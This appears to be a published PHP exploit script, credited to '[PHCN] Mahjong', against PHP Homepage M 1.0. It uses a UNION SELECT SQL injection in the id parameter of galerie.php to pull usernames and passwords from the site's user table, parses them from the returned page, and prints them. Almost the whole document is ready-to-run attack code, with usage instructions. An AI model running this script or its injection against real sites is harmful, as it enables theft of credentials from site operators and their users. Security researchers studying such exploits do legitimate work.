PHP Homepage M 1.0 galerie.php Remote SQL Injection Exploit
===========================================================



<?php
if ($argv[1] == &#039;&#039;)
{
echo "--PHP Homepage M V.1.0 galerie.php Exploit----\n";
echo "only with magic_quotes_gpc OFF\n";
echo "by [PHCN] Mahjong\n";
echo "Usage : phpHPmv1.php http://127.0.0.1 / 1\n";
echo &#039;----------------------------------------------&#039;;
}
else
{
$host = $argv[1];
$path = $argv[2];
$userid = $argv[3];

$data = $host.$path."galerie.php?act=show&id=99999&#039;+UNION+SELECT+username,passwort,passwort,passwort+FROM+user+WHERE+U ID=&#039;$userid";
$data = file_get_contents($data);
$pw = substr($data,strpos($data,&#039;<img border="0" src=\&#039;bilder/&#039;)+28,30);
$pw = explode(&#039;.&#039;,$pw);
$pw = $pw[0];
$user = substr($data,strpos($data,&#039;UID=\&#039;&#039;.$userid.&#039;\&#039;<h1 align="center">&#039;,30));
$user = explode(&#039;>&#039;,$user);
$user = strrev($user[1]);
$user = substr($user,4,100);
$user = strrev($user);

echo "--EXPLOIT FINISHED--\n";
echo "userid : $userid\n";
echo "username: $user\n";
echo "password: $pw\n";
echo &#039;--------------------&#039;;
}


?>



